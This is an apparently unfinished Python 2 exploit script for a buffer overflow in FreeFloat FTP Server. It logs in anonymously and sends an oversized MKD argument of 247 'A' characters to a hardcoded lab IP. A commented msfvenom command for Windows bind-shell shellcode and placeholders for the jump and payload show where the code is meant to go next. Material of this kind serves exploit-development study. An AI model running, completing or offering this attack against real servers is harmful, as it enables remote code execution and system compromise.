#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
FreeFloat FTP Server Exploit Fuzzer
1. python freefloat_ftp_server_fuzz.py
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = (

offset = "A" *247
#nowjump
#bufferandshellcode
sploit = offset

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nDestroy them with lazers..."
	s.connect(('172.16.73.129',21))
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.recv(1024)
	s.send('MKD ' + sploit + '\r\n\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close
	print "\nFire in the hole! Go pick up the pieces!"
except:
	print "ERROR! Shutting it dooooown.."
